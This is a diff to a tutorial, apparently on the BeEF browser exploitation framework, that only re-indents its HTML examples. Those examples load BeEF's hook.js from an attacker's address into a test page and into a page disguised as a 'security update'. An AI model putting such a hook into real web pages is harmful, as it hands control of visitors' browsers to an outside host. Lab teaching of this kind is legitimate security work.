@@ -92,7 +92,7 @@ You can also test BeEF locally, but be careful!
 </head>
 <body>
   <p>This is my local test site...</p>
-<script src="http://[your ip of wlan0 interface]:3000/hook.js"></script>
+  <script src="http://[your ip of wlan0 interface]:3000/hook.js"></script>
 </body>
 </html>
 ```
@@ -120,8 +120,8 @@ Content of file `/var/www/html/index.html`.
   <div id="patch">
     <span><!-- placeholder security update --></span>
   </div>
-<script type="text/javascript" src="scripts/script.js"></script>
-<script src="http://192.168.0.1:3000/hook.js"></script>
+  <script type="text/javascript" src="scripts/script.js"></script>
+  <script src="http://192.168.0.1:3000/hook.js"></script>
 </body>
 </html>
 ```
